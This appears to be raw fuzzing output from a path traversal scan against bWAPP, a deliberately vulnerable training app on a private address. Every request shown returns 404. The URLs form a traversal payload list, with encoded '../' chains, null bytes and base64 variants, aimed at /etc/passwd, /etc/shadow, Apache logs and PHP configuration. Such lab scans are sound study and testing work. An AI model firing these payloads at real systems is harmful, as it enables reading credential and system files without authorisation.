249,404,9L,39W,http://192.168.1.86/bWAPP//etc/security/user
250,404,9L,39W,http://192.168.1.86/bWAPP//etc/security/environ
251,404,9L,39W,http://192.168.1.86/bWAPP//etc/security/limits
252,404,9L,39W,http://192.168.1.86/bWAPP//usr/lib/security/mkuser.default
254,404,9L,39W,http://192.168.1.86/bWAPP//usr/local/pureftpd/etc/pure-ftpd.conf
255,404,9L,39W,http://192.168.1.86/bWAPP//usr/local/pureftpd/etc/pureftpd.pdn
256,404,9L,39W,http://192.168.1.86/bWAPP//usr/local/pureftpd/sbin/pure-config.pl
258,404,9L,39W,http://192.168.1.86/bWAPP/2fetc2fmaster.passwd
259,404,9L,39W,http://192.168.1.86/bWAPP/2fmaster.passwd
260,404,9L,39W,http://192.168.1.86/bWAPP/etc2fpasswd
261,404,9L,39W,http://192.168.1.86/bWAPP/etc2fshadow%00
262,404,9L,39W,http://192.168.1.86/bWAPP/2fetc2fpasswd
263,404,9L,39W,http://192.168.1.86/bWAPP/2fetc2fpasswd%00
264,404,9L,39W,http://192.168.1.86/bWAPP/..2fetc2fpasswd
265,404,9L,39W,http://192.168.1.86/bWAPP/..2fetc2fpasswd%00
266,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2fetc2fpasswd
267,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2fetc2fpasswd%00
268,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2fetc2fpasswd
269,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2fetc2fpasswd%00
270,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2f..2fetc2fpasswd
271,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2f..2fetc2fpasswd%00
272,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2fetc2fpasswd
273,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2fetc2fpasswd%00
274,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2f..2fetc2fpasswd
275,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2f..2fetc2fpasswd%00
276,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
277,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
278,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
279,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
280,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
281,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
282,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
283,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
284,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
285,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
286,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
287,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
288,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
289,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
290,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
291,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
292,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
293,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
294,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
295,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
296,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
297,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
298,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
299,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
300,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
301,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
302,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
303,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
304,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
305,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
306,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
307,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
308,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fshadow%00
310,404,9L,39W,http://192.168.1.86/bWAPP/2fboot2fgrub2fgrub.conf
311,404,9L,39W,http://192.168.1.86/bWAPP/2fproc2finterrupts
312,404,9L,39W,http://192.168.1.86/bWAPP/2fproc2fcpuinfo
313,404,9L,39W,http://192.168.1.86/bWAPP/2fproc2fmeminfo
315,404,9L,39W,http://192.168.1.86/bWAPP//usr/local/lib/php.ini
316,404,9L,39W,http://192.168.1.86/bWAPP//usr/local/php4/httpd.conf
317,404,9L,39W,http://192.168.1.86/bWAPP//usr/local/php4/httpd.conf.php
318,404,9L,39W,http://192.168.1.86/bWAPP//usr/local/php4/lib/php.ini
319,404,9L,39W,http://192.168.1.86/bWAPP//usr/local/php5/httpd.conf
320,404,9L,39W,http://192.168.1.86/bWAPP//usr/local/php5/httpd.conf.php
321,404,9L,39W,http://192.168.1.86/bWAPP//usr/local/php5/lib/php.ini
322,404,9L,39W,http://192.168.1.86/bWAPP//usr/local/php/httpd.conf
323,404,9L,39W,http://192.168.1.86/bWAPP//usr/local/php/httpd.conf.ini
324,404,9L,39W,http://192.168.1.86/bWAPP//usr/local/php/lib/php.ini
326,404,9L,39W,http://192.168.1.86/bWAPP/..2fapache2flogs2ferror.log
327,404,9L,39W,http://192.168.1.86/bWAPP/..2fapache2flogs2faccess.log
328,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2fapache2flogs2ferror.log
329,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2fapache2flogs2faccess.log
330,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2fapache2flogs2ferror.log
331,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2fapache2flogs2faccess.log
332,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2f..2f..2fetc2fhttpd2flogs2facces_log
333,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2f..2f..2fetc2fhttpd2flogs2facces.log
334,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2f..2f..2fetc2fhttpd2flogs2ferror_log
335,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2f..2f..2fetc2fhttpd2flogs2ferror.log
336,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2f..2f..2fvar2fwww2flogs2faccess_log
337,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2f..2f..2fvar2fwww2flogs2faccess.log
338,404,9L,40W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2f..2f..2fusr2flocal2fapache2flogs2faccess_%20log
339,404,9L,40W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2f..2f..2fusr2flocal2fapache2flogs2faccess.%20log
340,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2f..2f..2fvar2flog2fapache2faccess_log
341,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2f..2f..2fvar2flog2fapache22faccess_log
342,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2f..2f..2fvar2flog2fapache2faccess.log
343,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2f..2f..2fvar2flog2fapache22faccess.log
344,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2f..2f..2fvar2flog2faccess_log
345,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2f..2f..2fvar2flog2faccess.log
346,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2f..2f..2fvar2fwww2flogs2ferror_log
347,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2f..2f..2fvar2fwww2flogs2ferror.log
348,404,9L,40W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2f..2f..2fusr2flocal2fapache2flogs2ferror_l%20og
349,404,9L,40W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2f..2f..2fusr2flocal2fapache2flogs2ferror.l%20og
350,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2f..2f..2fvar2flog2fapache2ferror_log
351,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2f..2f..2fvar2flog2fapache22ferror_log
352,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2f..2f..2fvar2flog2fapache2ferror.log
353,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2f..2f..2fvar2flog2fapache22ferror.log
354,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2f..2f..2fvar2flog2ferror_log
355,404,9L,39W,http://192.168.1.86/bWAPP/..2f..2f..2f..2f..2f..2f..2fvar2flog2ferror.log
357,404,9L,39W,http://192.168.1.86/bWAPP/2fetc2finit.d2fapache
358,404,9L,39W,http://192.168.1.86/bWAPP/2fetc2finit.d2fapache2
359,404,9L,39W,http://192.168.1.86/bWAPP/2fetc2fhttpd2fhttpd.conf
360,404,9L,39W,http://192.168.1.86/bWAPP/2fetc2fapache2fapache.conf
361,404,9L,39W,http://192.168.1.86/bWAPP/2fetc2fapache2fhttpd.conf
362,404,9L,39W,http://192.168.1.86/bWAPP/2fetc2fapache22fapache2.conf
363,404,9L,39W,http://192.168.1.86/bWAPP/2fetc2fapache22fhttpd.conf
364,404,9L,39W,http://192.168.1.86/bWAPP/2fusr2flocal2fapache22fconf2fhttpd.conf
365,404,9L,39W,http://192.168.1.86/bWAPP/2fusr2flocal2fapache2fconf2fhttpd.conf
366,404,9L,39W,http://192.168.1.86/bWAPP/2fopt2fapache2fconf2fhttpd.conf
367,404,9L,39W,http://192.168.1.86/bWAPP/2fhome2fapache2fhttpd.conf
368,404,9L,39W,http://192.168.1.86/bWAPP/2fhome2fapache2fconf2fhttpd.conf
369,404,9L,39W,http://192.168.1.86/bWAPP/2fetc2fapache22fsites-available2fdefault
370,404,9L,39W,http://192.168.1.86/bWAPP/2fetc2fapache22fvhosts.d2fdefault_vhost.include
372,404,9L,39W,http://192.168.1.86/bWAPP/2fetc2fpasswd
373,404,9L,39W,http://192.168.1.86/bWAPP/2fetc2fshadow
374,404,9L,39W,http://192.168.1.86/bWAPP/2fetc2fgroup
375,404,9L,39W,http://192.168.1.86/bWAPP/2fetc2fsecurity2fgroup
376,404,9L,39W,http://192.168.1.86/bWAPP/2fetc2fsecurity2fpasswd
377,404,9L,39W,http://192.168.1.86/bWAPP/2fetc2fsecurity2fuser
378,404,9L,39W,http://192.168.1.86/bWAPP/2fetc2fsecurity2fenviron
379,404,9L,39W,http://192.168.1.86/bWAPP/2fetc2fsecurity2flimits
380,404,9L,39W,http://192.168.1.86/bWAPP/2fusr2flib2fsecurity2fmkuser.default
382,404,9L,39W,http://192.168.1.86/bWAPP/L2V0Yy9tYXN0ZXIucGFzc3dk
383,404,9L,39W,http://192.168.1.86/bWAPP/L21hc3Rlci5wYXNzd2Q=
384,404,9L,39W,http://192.168.1.86/bWAPP/ZXRjL3Bhc3N3ZA==
385,404,9L,39W,http://192.168.1.86/bWAPP/ZXRjL3NoYWRvdyUwMA==
386,404,9L,39W,http://192.168.1.86/bWAPP/L2V0Yy9wYXNzd2Q=
387,404,9L,39W,http://192.168.1.86/bWAPP/L2V0Yy9wYXNzd2QlMDA=
388,404,9L,39W,http://192.168.1.86/bWAPP/Li4vZXRjL3Bhc3N3ZA==
389,404,9L,39W,http://192.168.1.86/bWAPP/Li4vZXRjL3Bhc3N3ZCUwMA==
390,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vZXRjL3Bhc3N3ZA==
391,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vZXRjL3Bhc3N3ZCUwMA==
392,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vZXRjL3Bhc3N3ZA==
393,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
394,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
395,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
396,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
397,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
398,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
399,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
400,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
401,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
402,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
403,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
404,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
405,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
406,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
407,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
408,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
409,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
410,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
411,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
412,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
413,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
414,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
415,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
416,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
417,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
418,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
419,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
420,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
421,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
422,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
423,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
424,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
425,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
426,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
427,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
428,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
429,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
430,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
431,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3NoYWRvdyUwMA==
433,404,9L,39W,http://192.168.1.86/bWAPP/Li4vYXBhY2hlL2xvZ3MvZXJyb3IubG9n
434,404,9L,39W,http://192.168.1.86/bWAPP/Li4vYXBhY2hlL2xvZ3MvYWNjZXNzLmxvZw==
435,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vYXBhY2hlL2xvZ3MvZXJyb3IubG9n
436,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vYXBhY2hlL2xvZ3MvYWNjZXNzLmxvZw==
437,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vYXBhY2hlL2xvZ3MvZXJyb3IubG9n
438,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vYXBhY2hlL2xvZ3MvYWNjZXNzLmxvZw==
439,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL2h0dHBkL2xvZ3MvYWNjZXNfbG9n
440,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL2h0dHBkL2xvZ3MvYWNjZXMubG9n
441,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL2h0dHBkL2xvZ3MvZXJyb3JfbG9n
442,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL2h0dHBkL2xvZ3MvZXJyb3IubG9n
443,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vLi4vdmFyL3d3dy9sb2dzL2FjY2Vzc19sb2c=
444,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vLi4vdmFyL3d3dy9sb2dzL2FjY2Vzcy5sb2c=
445,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vLi4vdXNyL2xvY2FsL2FwYWNoZS9sb2dzL2FjY2Vzc18gbG9n
446,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vLi4vdXNyL2xvY2FsL2FwYWNoZS9sb2dzL2FjY2Vzcy4gbG9n
447,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vLi4vdmFyL2xvZy9hcGFjaGUvYWNjZXNzX2xvZw==
448,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vLi4vdmFyL2xvZy9hcGFjaGUyL2FjY2Vzc19sb2c=
449,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vLi4vdmFyL2xvZy9hcGFjaGUvYWNjZXNzLmxvZw==
450,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vLi4vdmFyL2xvZy9hcGFjaGUyL2FjY2Vzcy5sb2c=
451,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vLi4vdmFyL2xvZy9hY2Nlc3NfbG9n
452,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vLi4vdmFyL2xvZy9hY2Nlc3MubG9n
453,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vLi4vdmFyL3d3dy9sb2dzL2Vycm9yX2xvZw==
454,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vLi4vdmFyL3d3dy9sb2dzL2Vycm9yLmxvZw==
455,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vLi4vdXNyL2xvY2FsL2FwYWNoZS9sb2dzL2Vycm9yX2wgb2c=
456,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vLi4vdXNyL2xvY2FsL2FwYWNoZS9sb2dzL2Vycm9yLmxvZw==
457,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vLi4vdmFyL2xvZy9hcGFjaGUvZXJyb3JfbG9n
458,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vLi4vdmFyL2xvZy9hcGFjaGUyL2Vycm9yX2xvZw==
459,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vLi4vdmFyL2xvZy9hcGFjaGUvZXJyb3IubG9n
460,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vLi4vdmFyL2xvZy9hcGFjaGUyL2Vycm9yLmxvZw==
461,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vLi4vdmFyL2xvZy9lcnJvcl9sb2c=
